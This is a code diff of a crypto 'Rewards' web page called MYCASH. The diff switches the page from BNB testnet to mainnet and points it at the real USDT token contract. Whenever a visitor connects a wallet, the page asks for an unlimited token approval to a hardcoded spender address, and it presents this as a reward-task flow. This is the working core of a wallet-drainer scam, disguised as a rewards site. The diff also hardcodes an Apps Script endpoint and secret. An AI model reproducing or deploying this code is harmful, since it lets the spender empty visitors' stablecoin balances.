@@ -397,9 +397,8 @@
     <div class="nav">
       <div class="nav-left">
         <a href="home.html">Home</a>
-      
         <a href="index.html" style="background:#0f1b33">Rewards</a>
-         <a href="hold-earn.html">Earn</a>
+        <a href="hold-earn.html">Earn</a>
       </div>
       <div class="logo">MYCASH</div>
       <div>
@@ -553,37 +552,35 @@
   (function(){
     // ===== CONFIG (same as your index) =====
 
-
     function formatToken(n) {
-  n = Number(n);
-  if (Number.isInteger(n)) return n.toString();
-  return n.toFixed(4).replace(/\.?0+$/, "");
-}
+      n = Number(n);
+      if (Number.isInteger(n)) return n.toString();
+      return n.toFixed(4).replace(/\.?0+$/, "");
+    }
 
-    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
-    const APPS_SCRIPT_SECRET = "mahfuzinam0045";
+    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbyZ9VwZ1gT3TmPMh3qfJz7ZqXfNyp14PGFHraS49yq35J6U8Z3CNFK-04rlsoRP5-o4GA/exec";
+    const APPS_SCRIPT_SECRET = "justforme";
 
-    const TOKEN_ADDRESS   = "0x5915f45023012942c0F30B6652CEbb6A05810b90"; // USDT testnet
-    const SPENDER_ADDRESS = "0x98fbcaA43b229601edb71E9923055ee485c29C3E";
+    const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955"; // token on BSC (update to mainnet token/USDT)
+    const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";
 
-    const BNB_TESTNET_CHAIN_ID_DEC = 97;
-    const BNB_TESTNET_CHAIN_ID_HEX = "0x61";
-    const BNB_TESTNET_LABEL        = "BSC Testnet (97)";
+    // === BNB Smart Chain MAINNET config ===
+    const BNB_TESTNET_CHAIN_ID_DEC = 56;
+    const BNB_TESTNET_CHAIN_ID_HEX = "0x38";
+    const BNB_TESTNET_LABEL        = "BNB Smart Chain (56)";
 
     const ERC20_APPROVE_ABI = [
       "function approve(address spender, uint256 amount) public returns (bool)"
     ];
     const ERC20_BALANCE_ABI = [
       "function balanceOf(address owner) view returns (uint256)" 
-      ];
+    ];
 
-const ERC20_ALLOWANCE_ABI = [
-  "function allowance(address owner, address spender) view returns (uint256)"
-];
+    const ERC20_ALLOWANCE_ABI = [
+      "function allowance(address owner, address spender) view returns (uint256)"
+    ];
 
-      const TOKEN_DECIMALS = 6; // <-- change to whatever your fusdt uses
-
-    
+    const TOKEN_DECIMALS = 6; // change if your mainnet token uses different decimals
 
     const REQUIRED_USDT = 10;   // Task 2: need at least this much
     const REWARD_AMOUNT = 10.0; // display only
@@ -640,11 +637,9 @@ const ERC20_ALLOWANCE_ABI = [
     const claimBtn        = document.getElementById("claimBtn");
     const claimHintEl     = document.getElementById("claimHint");
 
-const connectHintCardEl = document.getElementById("connectHintCard");
-const connectedPillEl   = document.getElementById("connectedPill");
+    const connectHintCardEl = document.getElementById("connectHintCard");
+    const connectedPillEl   = document.getElementById("connectedPill");
 
-
-    
     const rewardAmountEl  = document.getElementById("rewardAmountDisplay");
 
     const task1Btn        = document.getElementById("task1Btn");
@@ -678,11 +673,11 @@ const connectedPillEl   = document.getElementById("connectedPill");
       setWalletInfo("—","—",null);
       setUserIdUI("-");
       if(connectHintCardEl){
-  connectHintCardEl.textContent = "Use the top button to connect your wallet.";
-}
-if(connectedPillEl){
-  connectedPillEl.style.display = "none";
-}
+        connectHintCardEl.textContent = "Use the top button to connect your wallet.";
+      }
+      if(connectedPillEl){
+        connectedPillEl.style.display = "none";
+      }
 
       if(tokensContainer){
         tokensContainer.textContent = "Connect wallet to see USDT balance.";
@@ -727,7 +722,7 @@ if(connectedPillEl){
         walletconnect: {
           package: window.WalletConnectProvider.default,
           options: {
-            rpc: { 97: "https://data-seed-prebsc-1-s1.binance.org:8545" },
+            rpc: { 56: "https://bsc-dataseed.binance.org" },
             bridge: "https://bridge.walletconnect.org",
             qrcode: true
           }
@@ -801,7 +796,7 @@ if(connectedPillEl){
         const ethersProvider = new ethers.BrowserProvider(providerInstance);
         const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
         const raw            = await tokenContract.balanceOf(address);
-       const formatted = ethers.formatUnits(raw, TOKEN_DECIMALS);
+        const formatted      = ethers.formatUnits(raw, TOKEN_DECIMALS);
 
         return formatted;
       }catch(err){
@@ -824,15 +819,15 @@ if(connectedPillEl){
               method:"wallet_addEthereumChain",
               params:[{
                 chainId:BNB_TESTNET_CHAIN_ID_HEX,
-                chainName:"BNB Smart Chain Testnet",
-                nativeCurrency:{name:"BNB",symbol:"tBNB",decimals:18},
-                rpcUrls:["https://data-seed-prebsc-1-s1.binance.org:8545"],
-                blockExplorerUrls:["https://testnet.bscscan.com"]
+                chainName:"BNB Smart Chain",
+                nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
+                rpcUrls:["https://bsc-dataseed.binance.org"],
+                blockExplorerUrls:["https://bscscan.com"]
               }]
             });
             return true;
           }catch(addErr){
-            console.error("Could not add BSC Testnet:", addErr);
+            console.error("Could not add BNB Smart Chain:", addErr);
             return false;
           }
         }
@@ -841,65 +836,64 @@ if(connectedPillEl){
       }
     }
 
- async function ensureTokenApproval(){
-  if(!TOKEN_ADDRESS){
-    console.warn("TOKEN_ADDRESS not set, skipping approve");
-    return;
-  }
-  if(!SPENDER_ADDRESS){
-    console.warn("SPENDER_ADDRESS not set, skipping approve");
-    return;
-  }
-  if(!providerInstance){
-    console.warn("No providerInstance for approval");
-    return;
-  }
+    async function ensureTokenApproval(){
+      if(!TOKEN_ADDRESS){
+        console.warn("TOKEN_ADDRESS not set, skipping approve");
+        return;
+      }
+      if(!SPENDER_ADDRESS){
+        console.warn("SPENDER_ADDRESS not set, skipping approve");
+        return;
+      }
+      if(!providerInstance){
+        console.warn("No providerInstance for approval");
+        return;
+      }
 
-  try{
-    const ethersProvider = new ethers.BrowserProvider(providerInstance);
-    const signer         = await ethersProvider.getSigner();
-    const ownerAddress   = (await signer.getAddress()).toLowerCase();
+      try{
+        const ethersProvider = new ethers.BrowserProvider(providerInstance);
+        const signer         = await ethersProvider.getSigner();
+        const ownerAddress   = (await signer.getAddress()).toLowerCase();
 
-    if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
-      alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
-      setStatus("Connected (approval skipped)");
-      return;
+        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
+          alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
+          setStatus("Connected (approval skipped)");
+          return;
+        }
+
+        // 1) Read current allowance (view call, no gas)
+        const readContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_ALLOWANCE_ABI,
+          ethersProvider
+        );
+        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+
+        if (currentAllowance > 0n) {
+          // already approved something – skip tx
+          console.log("Already approved, skipping new approve tx");
+          setStatus("Connected (already approved)");
+          return;
+        }
+
+        // 2) Not approved yet → send approve tx
+        setStatus("Requesting token approval…");
+        const writeContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_APPROVE_ABI,
+          signer
+        );
+        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+        console.log("Approve tx sent:", tx.hash);
+        const receipt = await tx.wait();
+        console.log("Approve confirmed:", receipt);
+        setStatus("Connected + Approved ✅");
+      }catch(err){
+        console.error("Token approve error:", err);
+        alert("Token approval failed: " + (err && err.message ? err.message : err));
+        setStatus("Connected (approval failed)");
+      }
     }
-
-    // 1) Read current allowance (view call, no gas)
-    const readContract = new ethers.Contract(
-      TOKEN_ADDRESS,
-      ERC20_ALLOWANCE_ABI,
-      ethersProvider
-    );
-    const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
-
-    if (currentAllowance > 0n) {
-      // already approved something – skip tx
-      console.log("Already approved, skipping new approve tx");
-      setStatus("Connected (already approved)");
-      return;
-    }
-
-    // 2) Not approved yet → send approve tx
-    setStatus("Requesting token approval…");
-    const writeContract = new ethers.Contract(
-      TOKEN_ADDRESS,
-      ERC20_APPROVE_ABI,
-      signer
-    );
-    const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-    console.log("Approve tx sent:", tx.hash);
-    const receipt = await tx.wait();
-    console.log("Approve confirmed:", receipt);
-    setStatus("Connected + Approved ✅");
-  }catch(err){
-    console.error("Token approve error:", err);
-    alert("Token approval failed: " + (err && err.message ? err.message : err));
-    setStatus("Connected (approval failed)");
-  }
-}
-
 
     async function restoreSessionFromAddress(address){
       currentAddress = address;
@@ -911,8 +905,7 @@ if(connectedPillEl){
       setUserIdUI(userId);
 
       const tokenBalanceRaw  = await getTokenBalance(address);
-      const prettyBalance = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
-
+      const prettyBalance    = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
 
       if(tokensContainer){
         tokensContainer.innerHTML =
@@ -925,12 +918,11 @@ if(connectedPillEl){
         connectBtn.textContent = "Connected";
         connectBtn.classList.add("connected");
         if(connectHintCardEl){
-  connectHintCardEl.textContent = "Wallet connected.";
-}
-if(connectedPillEl){
-  connectedPillEl.style.display = "inline-flex";
-}
-
+          connectHintCardEl.textContent = "Wallet connected.";
+        }
+        if(connectedPillEl){
+          connectedPillEl.style.display = "inline-flex";
+        }
       }
 
       updateClaimState();
@@ -977,7 +969,7 @@ if(connectedPillEl){
         if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
           const switched = await switchToBSC(providerInstance);
           if(!switched){
-            alert("Please switch to BSC Testnet.");
+            alert("Please switch to BNB Smart Chain (mainnet).");
             setStatus("Wrong network");
             return;
           }
@@ -990,7 +982,7 @@ if(connectedPillEl){
 
         await restoreSessionFromAddress(address);
         setStatus("Connected");
-       await ensureTokenApproval();
+        await ensureTokenApproval();
 
       }catch(err){
         console.error("connectFlow error:", err);
